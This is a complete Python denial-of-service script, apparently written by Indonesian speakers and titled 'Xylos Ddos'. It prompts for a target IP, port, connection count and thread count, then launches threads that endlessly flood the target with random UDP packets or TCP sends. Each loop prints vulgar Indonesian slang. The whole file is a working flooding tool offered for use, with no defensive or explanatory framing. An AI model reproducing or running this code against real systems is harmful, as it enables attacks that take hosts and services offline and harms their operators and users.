import random
import socket
import threading

print("Xylos Ddos")

ip = str(input("Masukkan ip"))
port = int(input("Masukkan Port"))
times = int(input("Masukkan Connecting"))
thread = int(input("Masukkan Thread"))
choice = str(input("y or n"))

def run():
  data = random._urandom(1025)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print("KONTOL")
    except:
      print("MEMEK")
      
def run2():
  data = random._urandom(16)
  while True:
    try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print("jembot")
    except:
      s.close()
      print("YOSH")
      
for y in range(thread):
  if choice == "y":
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
